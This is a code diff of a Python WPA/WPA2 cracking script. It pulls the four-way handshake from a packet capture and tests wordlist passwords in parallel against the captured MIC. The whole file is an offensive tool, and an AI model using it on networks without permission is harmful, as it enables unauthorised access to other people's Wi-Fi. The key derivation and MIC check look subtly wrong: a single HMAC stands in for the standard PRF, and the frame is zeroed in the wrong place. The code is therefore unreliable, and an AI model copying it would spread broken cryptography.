@@ -1,94 +1,101 @@
 import hashlib
 import hmac
 import struct
+import os
 from scapy.all import *
 from Crypto.Protocol.KDF import PBKDF2
+from multiprocessing import Pool
 
-# Define constants
+# Constants
 EAPOL_TYPE = 0x888e
 MIC_LENGTH = 16
 PMK_LENGTH = 32
-PTK_LENGTH = 16
 ANONCE_LENGTH = 32
 SNONCE_LENGTH = 32
 MAC_ADDR_LENGTH = 6
 
-# Function to derive PMK using PBKDF2
 def derive_pmk(ssid, password):
+    """Derive PMK using PBKDF2."""
     return PBKDF2(password, ssid.encode('utf-8'), dkLen=PMK_LENGTH, count=4096, prf=None)
 
-# Function to derive PTK
 def derive_ptk(pmk, anonce, snonce, ap_mac, client_mac):
-    # Prepare the data for HMAC calculation
-    data = ap_mac + client_mac + anonce + snonce
-    hmac_sha1 = hmac.new(pmk, data, hashlib.sha1)
-    return hmac_sha1.digest()
+    """Derive PTK using PMK, ANonce, SNonce, and MAC addresses."""
+    data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
+    return hmac.new(pmk, data, hashlib.sha1).digest()[:16]
 
-# Function to validate MIC
 def validate_mic(ptk, mic, eapol_frame):
-    # HMAC-SHA1 calculation to validate the MIC
-    calculated_mic = hmac.new(ptk, eapol_frame, hashlib.sha1).digest()
+    """Validate the MIC using HMAC-SHA1."""
+    eapol_mic = eapol_frame[:-MIC_LENGTH] + b'\x00' * MIC_LENGTH
+    calculated_mic = hmac.new(ptk, eapol_mic, hashlib.sha1).digest()[:MIC_LENGTH]
     return calculated_mic == mic
 
-# Function to extract handshake parameters from pcap
 def extract_handshake(pcap_file):
-    ap_mac = None
-    client_mac = None
-    anonce = None
-    snonce = None
-    mic = None
-    eapol_frame = None
+    """Extract handshake parameters from the PCAP file."""
+    try:
+        packets = rdpcap(pcap_file)
+    except Exception as e:
+        print(f"[-] Error reading PCAP file: {e}")
+        return None
 
-    # Read pcap file using scapy
-    packets = rdpcap(pcap_file)
-    eapol_packet_count = 0
+    ap_mac, client_mac, anonce, snonce, mic, eapol_frame = None, None, None, None, None, None
+    eapol_frames = [p for p in packets if p.haslayer(EAPOL)]
 
-    for packet in packets:
-        if EAPOL_TYPE == packet.getlayer(EAPOL).type:
-            eapol_packet_count += 1
+    if len(eapol_frames) < 2:
+        print("[-] Not enough EAPOL frames for a handshake.")
+        return None
 
-            if eapol_packet_count == 1:
-                # First EAPOL frame
-                ap_mac = packet[Ether].src
-                client_mac = packet[Ether].dst
-                anonce = packet[EAPOL].load[25:25+ANONCE_LENGTH]
-                eapol_frame = bytes(packet)
-            elif eapol_packet_count == 2:
-                # Second EAPOL frame
-                snonce = packet[EAPOL].load[25:25+SNONCE_LENGTH]
-                mic = packet[EAPOL].load[-MIC_LENGTH:]
-                break
+    for frame in eapol_frames:
+        if ap_mac is None:
+            ap_mac = frame[Ether].src
+            client_mac = frame[Ether].dst
+            anonce = frame[EAPOL].load[13:45]
+        elif snonce is None:
+            snonce = frame[EAPOL].load[13:45]
+            mic = frame[EAPOL].load[-MIC_LENGTH:]
+            eapol_frame = bytes(frame)
+            break
 
-    if eapol_packet_count < 2:
-        print("[-] No valid handshake found in the capture file.")
-        return None, None, None, None, None, None
+    if not all([ap_mac, client_mac, anonce, snonce, mic, eapol_frame]):
+        print("[-] Incomplete handshake.")
+        return None
 
     return ap_mac, client_mac, anonce, snonce, mic, eapol_frame
 
-# Perform dictionary attack
-def crack_password(pcap_file, wordlist, ssid):
-    ap_mac, client_mac, anonce, snonce, mic, eapol_frame = extract_handshake(pcap_file)
-    if ap_mac is None:
+def try_password(args):
+    """Try a single password."""
+    password, ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame = args
+    pmk = derive_pmk(ssid, password)
+    ptk = derive_ptk(pmk, anonce, snonce, ap_mac, client_mac)
+    if validate_mic(ptk, mic, eapol_frame):
+        return password
+    return None
+
+def crack_password(pcap_file, wordlist, ssid, output_file="found_password.txt"):
+    """Perform a dictionary attack to crack WPA/WPA2 passwords."""
+    handshake = extract_handshake(pcap_file)
+    if handshake is None:
         return
 
+    ap_mac, client_mac, anonce, snonce, mic, eapol_frame = handshake
+    print("[*] Handshake successfully extracted.")
+    print(f"    AP MAC: {ap_mac}, Client MAC: {client_mac}")
+
     with open(wordlist, "r") as file:
-        for password in file:
-            password = password.strip()  # Remove newline characters
+        passwords = [line.strip() for line in file]
 
-            # Derive PMK
-            pmk = derive_pmk(ssid, password)
+    args = [(password, ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame) for password in passwords]
 
-            # Derive PTK
-            ptk = derive_ptk(pmk, anonce, snonce, ap_mac, client_mac)
-
-            # Validate the MIC
-            if validate_mic(ptk, mic, eapol_frame):
-                print(f"[+] Password found: {password}")
+    print("[*] Starting dictionary attack...")
+    with Pool() as pool:
+        for result in pool.imap_unordered(try_password, args):
+            if result:
+                print(f"[+] Password found: {result}")
+                with open(output_file, "w") as f:
+                    f.write(result + "\n")
                 return
 
     print("[-] Password not found in the provided wordlist.")
 
-# Main function
 if __name__ == "__main__":
     import sys
     if len(sys.argv) != 4:
@@ -98,5 +105,13 @@ if __name__ == "__main__":
     pcap_file = sys.argv[1]
     wordlist = sys.argv[2]
     ssid = sys.argv[3]
+
+    if not os.path.exists(pcap_file):
+        print(f"[-] PCAP file '{pcap_file}' does not exist.")
+        sys.exit(1)
+
+    if not os.path.exists(wordlist):
+        print(f"[-] Wordlist file '{wordlist}' does not exist.")
+        sys.exit(1)
 
     crack_password(pcap_file, wordlist, ssid)
